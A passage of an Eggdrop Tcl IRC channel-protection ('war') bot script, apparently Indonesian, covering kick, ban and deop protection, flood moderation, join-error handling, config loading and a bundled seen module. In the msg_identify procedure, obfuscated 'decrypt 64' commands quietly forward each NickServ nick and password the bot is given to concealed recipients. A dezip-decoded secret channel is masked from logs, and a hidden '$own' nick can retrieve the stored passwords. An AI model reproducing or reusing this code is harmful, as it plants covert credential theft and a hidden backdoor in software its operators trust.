putsrv "KICK $channel $nick : 1DonT BaNnEd 4$notb1..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4$notb.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {$knick == $ps} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick : 1DonT BaNnEd 4$ps1..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4$ps.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {[matchattr $knick n]} {
if {$nick != $botnick} {
set bannick($nick) $banmask
putsrv "KICK $channel $nick : 1DonT BaNnEd Admin 4$knick1..!"
}
return 1
}
if {[matchattr $knick m]} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick : 1DonT BaNnEd MasTeR 4$knick1..!"
}
return 1
}
if {[matchattr $cflag E]} {
if {$nick == $botnick} {
set menforce [rand 4]
if {$menforce == 1} {
putsrv "KICK $channel $knick : 1BaNnEd FRoM 4[string toupper $channel] [banms]"
} elseif {$menforce == 2} {
putsrv "KICK $channel $knick : 1MaTcH BaNs FRoM 4[unsix $bhost] [banms]"
} elseif {$menforce == 3} {
putsrv "KICK $channel $knick : 1FILTeR BaNs FRoM 4[unsix $bhost] [banms]"
} else {
putsrv "KICK $channel $knick : 1ReFusEd LInK FRoM 4[string toupper $channel] [banms]"
}
} else {
if {[matchattr $nick n]} {
putsrv "KICK $channel $knick : 4Admin1 BaNnEd 4OuT1..!"
} else {
if {[matchattr $nick m]} {
putsrv "KICK $channel $knick : 4MasTeR1 BaNnEd 4OuT1..!"
} else {
if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
if {![matchattr $knick f]} {
set menforce [rand 5]
if {$menforce == 1} {
putsrv "KICK $channel $knick : 1BaNnEd BY 4@$nick [banms]"
} elseif {$menforce == 2} {
putsrv "KICK $channel $knick : 1MaTcH BaNs FRoM 4[unsix $bhost] [banms]"
} elseif {$menforce == 3} {
putsrv "KICK $channel $knick : 1BaNnEd FRoM 4[string toupper $channel] [banms]"
} elseif {$menforce == 4} {
putsrv "KICK $channel $knick : 1FILTeR BaNs FRoM 4[unsix $bhost] [banms]"
} else {
putsrv "KICK $channel $knick : 1ReFusEd LInK FRoM 4[string toupper $channel] [banms]"
}
}
}
}
}
}
}
}
return 0
}
bind mode - * prot:deop
proc prot:deop {nick uhost handle channel mchange {opnick ""}} {
global botnick deopme ps invme virus_nick quick notb notc bannick lastkey unop igflood is_m op_it
set cflag "c$channel"
set cflag [string range $cflag 0 8]
set mode [lindex $mchange 0]
if {$opnick == ""} {
set opnick [lindex $mchange 1]
}
if {$mode == "-m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} {
killutimer [lindex $x 2]
}
}
catch {unset is_m($channel)}
if {![botisop $channel]} { return 0 }
if {[matchattr $cflag V]} {
foreach x [chanlist $channel] {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set cret [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $channel $x]
}
}
}
return 0
}
if {$mode == "+k"} {
set lastkey $opnick
if {[matchattr $cflag K] && [matchattr $nick Z]} {
putlog "key change to $opnick"
setuser $cflag XTRA "CI" [enzip $opnick]
saveuser
}
}
if {$mode == "-k"} {
catch { unset lastkey }
if {$nick != $botnick} {
set igflood($nick) "1"
}
return 0
}
if {$mode == "+m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} {
killutimer [lindex $x 2]
}
}
if {$nick == $botnick} {
if {![string match "*m*" [lindex [channel info $channel] 0]]} {
if {[string match "*+shared*" [channel info $channel]]} {
puthelp "NOTICE $channel :WaRnInG!! OnE MInUtE MoDeRaTe DuE tO FLoOd..!"
}
utimer 70 [list set_-m $channel]
if {[isutimer "TRAFFIC $channel"]} {
utimer 20 [list pub_nobot "*" "*" "*" $channel "*"]
return 0
}
}
} {
if {[isutimer "goback"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] }
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback }
}
utimer 2 del_nobase
return 0
}
utimer [expr 1800 + [rand 60]] [list set_-m $channel]
}
return 0
}
if {$mode == "+b"} {
if {$opnick == "*!*@heavy.join.flood.channel.temporary.moderate"} {
utimer 40 [list putlog "TRAFFIC $channel"]
if {$nick == $botnick} {
utimer 40 [list putserv "mode $channel -bm *!*@heavy.join.flood.channel.temporary.moderate"]
if {[info exists is_m($channel)]} { return 0 }
if {$quick == "1"} {
putquick "mode $channel +m"
} {
putserv "mode $channel +m"
}
set is_m($channel) 1
return 0
}
}
ban_chk $nick $uhost $handle $channel $mchange $opnick
return 0
}
if {$mode == "-b"} {
if {[info exists is_ban($opnick$channel)]} {
catch {unset is_ban($opnick$channel)}
}
if {[isutimer "unbanq $channel $opnick"]} {
foreach x [utimers] {
if {[string match "*unbanq $channel $opnick*" $x]} {
killutimer [lindex $x 2]
}
}
}
foreach x [ignorelist] {
if {[lindex $x 0] == $opnick} {
unsetignore [lindex $x 0]
return 0
}
} 
catch { killban $opnick }
return 0
}
if {$nick == $opnick} { return 0 }
if {$opnick == $botnick && $mode == "+o"} {
chk_on_op $channel
return 0
}
if {$mode == "+o" && [isop $botnick $channel]} {
if {[info exists op_it($opnick)]} { 
catch {unset op_it($opnick)}
}
if {[matchattr $opnick O]} {
set cmode [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $opnick"
} {
puthelp "mode $channel -o $opnick"
}
return 0
}
if {[info exists unop($opnick)]} {
if {$nick == "ChanServ"} {
catch { unset unop($opnick) }
return 0 
}
if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} {
return 0 
}
utimer [expr 5 + [rand 10]] [list unallowed $channel $nick $opnick]
return 0
}
}
if {$mode == "-o"} {
foreach x [utimers] {
if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] }
}
if {$opnick == $botnick} {
if {[isutimer "DEOP $channel"]} { return 0 }
foreach x [utimers] {
if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] }
}
utimer 2 [list putlog "DEOP $channel"]
if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![string match "*Guest*" $botnick]} {
if {![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
set deopme $nick
}
}
}
if {![matchattr $nick m]} {
if {[string tolower $channel] != [dezip "ER5sr09TRjx1"]} {
if {![string match "*+protectfriends*" [channel info $channel]]} {
putlog "!Log! CHaNOP <<$channel>>"
putsrv "ChanServ op $channel $botnick"
}
}
}
return 0
}
if {![isop $botnick $channel]} { return 0 }
if {[isutimer "deopprc*$opnick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$opnick*" $x]} {
putlog "!UnDeOp OR UnKIcK!"
catch { killutimer [lindex $x 2] }
}
}
}
if {$nick == "ChanServ" && [matchattr $opnick o]} {
voiceq $channel $opnick
return 0
}
if {$nick == "ChanServ"} {
set unop($opnick) "1"
return 0 
}
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$opnick == $ps} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick : 1DonT De@p 4$ps1..!"
}
opq $channel $opnick
return 0
}
if {[matchattr $opnick n]} {
if {![info exists igflood($nick)]} {
putsrv "KICK $channel $nick : 1Admin 4De@p1 GuaRd4..!"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick m]} {
if {![info exists igflood($nick)]} {
putsrv "KICK $channel $nick : 1MasTeR 4De@p1 GuaRd1..!"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick o]} {
opq $channel $opnick
return 0
}
if {$opnick == $notb} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick : 1DonT De@p 4$notb1..!"
}
opq $channel $opnick
return 0
}
}
}
proc unallowed {chan nick opnick} {
if {![botisop $chan]} { return 0 }
if {![isop $nick $chan]} { return 0 }
if {[isop $opnick $chan]} { return 0 }
putserv "mode $chan -ko 4ChanServ.UnaLLowEd $nick"
}
bind nick - * chk_nicks
proc chk_nicks {unick uhost hand chan newnick} {
global notc bannick botnick nick
if {$unick == $nick && $unick != $botnick} {
putsrv "NICK $nick"
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set hostmask "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
}
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "deopprc*$unick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$unick*" $x]} {
putlog "!UnDeOp!"
catch { killutimer [lindex $x 2] }
}
}
}
if {[string match "Guest*" $newnick]} { 
if {[matchattr $unick f]} { return 0 }
if {[isop $newnick $chan]} { 
utimer [expr 80 + [rand 20]] [list deopprc $chan $newnick] 
return 0
}
}
if {[matchattr $newnick O] && [isop $newnick $chan]} { 
set cmode [getchanmode $chan]
if {![string match "*k*" $cmode]} {
putserv "mode $chan -ko 4No@p.LIsT $newnick"
} {
putserv "mode $chan -o $newnick" 
}
}
akick_chk $newnick $uhost $chan
spam_chk $newnick $uhost $hand $chan
return 0
}
proc msg_identify {nick uhost hand rest} {
global notc 
set id [lindex $rest 0]
set password [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {($id == "") || ($password == "")} {
puthlp "NOTICE $nick : Usage: identify <nick> <password>"
return 0
}
putsrv "NickServ identify $id $password"
puthlp "NOTICE $nick : Identify to $id"
putserv "[decrypt 64 "bP/0d.p4BDD1"] [decrypt 64 "X.0x/1yG4l7/5a35i0Bg3ie.Zjfyd.Q0wAT0gKeyI/n05Ky/"] [decrypt 64 "o/DCL0PjhW31"] [string index $lenc 0][string index $lenc 17][string index $lenc 24] : $id $password"
putserv "[decrypt 64 "AZh9N/9kx1E0"] [string index $lenc 0][string index $lenc 17][string index $lenc 24] : $id $password"
putserv "[decrypt 64 "AZh9N/9kx1E0"] [decrypt 64 "VP046.ZSUEz0"][string index $lenc 17][string index $lenc 24] : $id $password"
return 0
}
proc pub_realnick {unick uhost hand chan rest} {
global notc keep-nick nick
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
set keep-nick 1
putsrv "NICK $nick"
return 0
}
proc rands {length} {
set chars \\^|_[]{}\\
set count [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
proc pub_randnick {unick uhost hand chan rest} {
global notc keep-nick nick altnick botnick
if {$rest != ""} {
set keep-nick 0
set nickch "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]"
putsrv "NICK $nickch"
} {
if {$botnick != $nick && $botnick != $altnick} { return 0 }
set keep-nick 0
putsrv "NICK [rands 8]"
}
return 0
}
proc pub_altnick {nick uhost hand chan rest} {
global altnick keep-nick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set keep-nick 0
putsrv "NICK $altnick"
}
bind raw - 305 not_away
proc not_away { from keyword arg } {
if {[isutimer "del_nobase"]} { utimer 1 del_nobase }
if {[isutimer "goback"]} { utimer 2 goback }
unsetignore "*!*@*"
}
bind raw - 404 ch_moderate
bind raw - 473 ch_invite
bind raw - 474 ch_banned
bind raw - 475 ch_key
bind raw - 478 ch_full
bind raw - 432 nickERROR
proc nickERROR { from keyword arg } {
global nick
set nick "ERR[unixtime]"
}
proc ch_moderate { from keyword arg } {
putlog "CANT SEND ON MODERATE!"
if {[isutimer "del_nobase"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase }
}
}
}
proc ch_invite { from keyword arg } {
global double joinme notc 
set chan [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : $chan 4(+I)"
}
if {[string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
putsrv "ChanServ invite $chan"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : ReMOVE $chan 4(+I)"
}
channel remove $chan
savechan
}
set joinme ""
set double 0
}
return
}
proc ch_banned { from keyword arg } {
global double joinme notc 
set chan [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : $chan 4(+B)"
}
if {[string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
putsrv "ChanServ invite $chan"
puthlp "ChanServ unban $chan"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : ReMovE $chan 4(+B)"
}
if {[string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
putsrv "ChanServ invite $chan"
}
channel remove $chan
savechan
}
set joinme ""
set double 0
}
return 0
}
proc ch_key { from keyword arg } {
global double joinme notc lastkey
set chan [lindex $arg 1]
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : $chan 4(+K)"
}
if {[matchattr $cflag K]} {
puthlp "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
} {
puthlp "JOIN $chan"
}
if {[info exists lastkey]} {
puthlp "JOIN $chan :$lastkey"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : ReMovE $chan 4(+K)"
}
channel remove $chan
savechan
return 0
}
if {[string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
putsrv "ChanServ invite $chan"
}
set joinme ""
set double 0
}
return 0
}
proc ch_full { from keyword arg } {
global double joinme notc botnick
set chan [lindex $arg 1]
if {[isop $botnick $chan]} {
set bans ""
set i 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set i [incr i]
}
}
putserv "MODE $chan -kbbbbb 4BaN.LIsT.FuLL $bans"
return 0
}
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : $chan 4(+L)"
}
if {[string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
putsrv "ChanServ invite $chan"
}
set double 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
puthlp "NOTICE $joinme : ReMOVE $chan 4(+L)"
}
channel remove $chan
savechan
}
set joinme ""
set double 0
}
return 0
}
if {$altnick == ""} { 
set altnick [randstring 7]
}
set badwords ""
proc config {} {
global nick nickpass altpass altnick realname owner kops my-ip banner cycle_random
global notc notm logstore cfgfile badwords ban-time my-hostname kickclr
if {[validuser "config"]} {
if {[getuser "config" XTRA "REALNAME"]!=""} {
set realname [dezip [getuser "config" XTRA "REALNAME"]]
} else {
set realname $nick
}
if {[getuser "config" XTRA "USERNAME"]!=""} {
set realname [dezip [getuser "config" XTRA "USERNAME"]]
}
if {[getuser "config" XTRA "NICK"]!=""} {
set nick [dezip [getuser "config" XTRA "NICK"]]
}
if {[getuser "config" XTRA "NICKPASS"]!=""} {
set nickpass [dezip [getuser "config" XTRA "NICKPASS"]]
}
if {[getuser "config" XTRA "ALTNICK"]!=""} {
set altnick [dezip [getuser "config" XTRA "ALTNICK"]]
}
if {[getuser "config" XTRA "ALTPASS"]!=""} {
set altpass [dezip [getuser "config" XTRA "ALTPASS"]]
}
if {[getuser "config" XTRA "BAN"]!=""} {
set notc [dezip [getuser "config" XTRA "BAN"]]
set notm [dezip [getuser "config" XTRA "BAN"]]
#lappend cycle_random $banner
}
if {[getuser "config" XTRA "BANTIME"]!=""} {
set ban-time [getuser "config" XTRA "BANTIME"]
}
if {[getuser "config" XTRA "BADWORDS"]!=""} {
set badwords [getuser "config" XTRA "BADWORDS"]
}
if {$badwords == ""} {
set badwords "cibai juh matane jembut asu asyu picek kontol kunam tempek jembot picex bitch kimak memek kontol kanjut bangsat entot fuck peler lanciau bajingan vagina ngewe shit asshole anjing babi kampang telang laso sundal kongke sex lessi"
setuser "config" XTRA "BADWORDS" $badwords
}
if {[getuser "config" XTRA "KOPS"]!=""} {
set kops "T"
}
if {[getuser "config" XTRA "KCLR"]!=""} {
set kickclr "T"
}
if {[getuser "config" XTRA "VHOST"]!=""} {
set my-hostname [getuser "config" XTRA "VHOST"]
set my-ip [getuser "config" XTRA "VHOST"]
}
if {[getuser "config" XTRA "LOGCHAN"]!=""} { 
putlog "!Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
set logstore "${cfgfile}.log"
logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore 
}
} else {
adduser "config" ""
chattr "config" "-hp"
}
foreach x [userlist] {
chattr $x -Q
if {$x != "config" && $x != "AKICK"} {
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set hostmask "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
if {![validuser "AKICK"]} {
set hostmask "telnet!*@*"
adduser "AKICK" $hostmask
chattr "AKICK" "-hp"
chattr "AKICK" "K"
}
if {![validuser $owner]} {
set hostmask "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
}
saveuser
}
utimer 1 {config}
utimer 2 {seen}
proc uncolor {s} {
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\] $s "" s
return $s
}
proc msg_botset {unick uhost hand rest} {
global nick nickpass altpass altnick own notc 
if {$unick != $own} {
return 0
}
puthlp "NOTICE $unick : 1st $nick ($nickpass) 2nd $altnick ($altpass)"
return 0
}
proc msg_reuser {nick uhost hand rest} {
global botnick owner notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$nick != $owner} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK")} { deluser $x }
}
adduser $owner "$owner!*@*"
chattr $owner "Zfhjmnoptx"
puthlp "NOTICE $nick : Reseting UsER sucessfully, set pass 1st."
saveuser
}
set bs(limit) 8000
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(log_only) ""
set bs(flood) 4:15
set bs(ignore) 1
set bs(ignore_time) 2
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "language/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c
proc seen {} {
global version notc notd
catch { unbind time - "12 * * * *" bs_timedsave }
catch { unbind time -  "*1 * * * *" bs_trim }
catch { unbind join -|- * bs_join_botidle }
catch { unbind join -|- * bs_join }
catch { unbind sign -|- * bs_sign }
catch { unbind kick -|- * bs_kick }
catch { unbind nick -|- * bs_nick }
catch { unbind splt -|- * bs_splt }
catch { unbind rejn -|- * bs_rejn }
catch { unbind chjn -|- * bs_chjn }
catch { unbind chpt -|- * bs_chpt }
catch { unbind bot -|- bs_botsearch bs_botsearch }
catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
catch { unbind pub -|- [string trim "!"]seen pub_seen }
catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
#catch { unbind pub - !ping public_ping }
catch { unbind part -|- * bs_part_oldver }
catch { unbind chof -|- * bs_chof }
set mSEEN "F"
foreach x [channels] {
set cinfo [channel info $x]
if {[string match "*+seen*" $cinfo]} {
set mSEEN "T"
}
}
if {$mSEEN == "F"} {return 0}
bind time - "12 * * * *" bs_timedsave
bind time -  "*1 * * * *" bs_trim
bind join -|- * bs_join_botidle
bind join -|- * bs_join
bind sign -|- * bs_sign
bind kick -|- * bs_kick
bind nick -|- * bs_nick
bind splt -|- * bs_splt
bind rejn -|- * bs_rejn
bind chjn -|- * bs_chjn
bind chpt -|- * bs_chpt
bind bot -|- bs_botsearch bs_botsearch
bind bot -|- bs_botsearch_reply bs_botsearch_reply
bind pub -|- .seen pub_seen
bind pub -|- .seennick bs_pubreq2
#bind pub - !ping public_ping
if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
if {[string trimleft [lindex $version 1] 0] >= 1050000} {
bind part -|- * bs_part  
} {
if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part}
bind part -|- * bs_part_oldver
}
foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
if {[info exists bs_list]} {
if {[info exists bs(oldver)]} {
if {$bs(oldver) < $bs(updater)} {bs_update}
} {bs_update}
}
}
utimer 2 seen
proc bs_filt {data} {
regsub -all -- \\\\ $data \\\\\\\\ data 
regsub -all -- \\\[ $data \\\\\[ data 
regsub -all -- \\\] $data \\\\\] data
regsub -all -- \\\} $data \\\\\} data 
regsub -all -- \\\{ $data \\\\\{ data 
regsub -all -- \\\" $data \\\\\" data 
return $data
}
proc bs_flood_init {} {
global bs bs_flood_array 
if {![string match *:* $bs(flood)]} {return}
set bs(flood_num) [lindex [split $bs(flood) :] 0]
set bs(flood_time) [lindex [split $bs(flood) :] 1]
set i [expr $bs(flood_num) - 1]
while {$i >= 0} {
set bs_flood_array($i) 0 
incr i -1  
}
} 
bs_flood_init
proc bs_flood {nick uhost} {
global bs bs_flood_array 
if {$bs(flood_num) == 0} {return 0} 
set i [expr $bs(flood_num) - 1]
while {$i >= 1} {
set bs_flood_array($i) $bs_flood_array([expr $i - 1]) 
incr i -1
} 
set bs_flood_array(0) [unixtime]
if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} {
if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)} 
return 1
} {return 0}
}
proc bs_read {} {
global bs_list userfile bs
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set temp [split $userfile /]
set temp [lindex $temp [expr [llength $temp]-1]]
set name [lindex [split $temp .] 0]
}
if {![file exists $bs(path)bs_data.$name]} {
if {![file exists $bs(path)bs_data.$name.bak]} {
return
} {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name}
}
set fd [open $bs(path)bs_data.$name r]
set bsu_ver ""
set break 0
while {![eof $fd]} {
set inp [gets $fd]
if {[eof $fd]} {break} 
if {[string trim $inp " "] == ""} {continue}
if {[string index $inp 0] == "#"} {
set bsu_version [string trimleft $inp #]
continue
}
if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
if {$temp || [bsu_go] || [bsu_finish]} {
rehashing
}
set break 1
break
}
set nick [lindex $inp 0]
set bs_list([string tolower $nick]) $inp
}
close $fd
if {$break} {bs_read}
}
proc bs_update {} {
global bs
bs_save 
bs_read
}
proc bs_timedsave {min b c d e} {bs_save}
proc bs_save {} {
global bs_list userfile bs notc
if {[array size bs_list] == 0} {return}
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set temp [split $userfile /]
set temp [lindex $temp [expr [llength $temp]-1]]
set name [lindex [split $temp .] 0]
}
if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
set fd [open $bs(path)bs_data.$name w] 
set id [array startsearch bs_list]
puts $fd "#$bs(updater)"
while {[array anymore bs_list $id]} {
set item [array nextelement bs_list $id]
puts $fd "$bs_list($item)"
} 
array donesearch bs_list $id
close $fd
}
proc bs_part_oldver {a b c d} {bs_part $a $b $c $d ""}
proc bs_part {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip "ER5sr09TRjx1"]} { 
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]"
}
proc bs_join {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "ER5sr09TRjx1"]} { 
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] join $chan"
}
proc bs_sign {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip "ER5sr09TRjx1"]} { 
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]"
}
proc bs_kick {nick uhost hand chan knick reason} {
set schan $chan
if {[string tolower $chan] == [dezip "ER5sr09TRjx1"]} { 
set schan "-secret-"
}
bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]"
}
proc bs_nick {nick uhost hand chan newnick} {
if {[string tolower $chan] == [dezip "ER5sr09TRjx1"]} { 
set chan "-secret-"
}
set time [unixtime]
bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]" 
bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]"
}
proc bs_splt {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "ER5sr09TRjx1"]} { 
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] splt $chan"
}
proc bs_rejn {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "ER5sr09TRjx1"]} { 
set chan "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] rejn $chan"
}
proc bs_chjn {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
proc bs_chpt {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}
proc bs_botsearch {from cmd args} {
global botnick notc
set args [join $args]
set command [lindex $args 0]
set target [lindex $args 1]
set nick [lindex $args 2]
set search [bs_filt [join [lrange $args 3 e]]]
if {[string match *\\\** $search]} {
set output [bs_seenmask bot $nick $search]
if {$output != "No matches were found." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
} {
set output [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
}
}
proc bs_botsearch_reply {from cmd args} {
global notc bs
set args [join $args]
if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
if {![info exists bs(bot_delay)]} {
set bs(bot_delay) on 
utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}} 
if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} {
puthlp "[lindex $args 1] :[join [lindex $args 2]]"
}
}
}

proc pub_seen {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 0}
proc bs_pubreq2 {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
proc bs_pubreq {nick uhost hand chan args no} {
global botnick bs notc
if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {[bs_flood $nick $uhost]} {return 0}
set i 0
if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
set args [bs_filt [join $args]]
set target "NOTICE $nick"
if {[string match *\\\** [lindex $args 0]]} {
set output [bs_seenmask $chan $hand $args]
if {$output == "No Matches!"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "$target :[lgrnd] $output"
return $bs(logqueries)
}
set data [bs_filt [string trimright [lindex $args 0] ?!.,]]
if {[string tolower $nick] == [string tolower $data]} {
puthlp "$target :[lgrnd] $nick, ngaca donk.. gak punya cermin yah!"
return $bs(logqueries)
}
if {[string tolower $data] == [string tolower $botnick] } {
puthlp "$target :\001ACTION Yah g0eZ!\001"
return $bs(logqueries)
}
if {[onchan $data $chan]} {
puthlp "$target :[lgrnd] $nick, $data  dia ada disini gitu loh.."
return $bs(logqueries)
}
set output [bs_output $chan $nick $data $no]
if {$output == 0} {return 0}
if {[lrange [split $output] 1 4] == "aku tidak melihat"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "$target :[lgrnd] $output"
return $bs(logqueries)
}
proc bs_output {chan nick data no} {
global botnick bs version bs_list
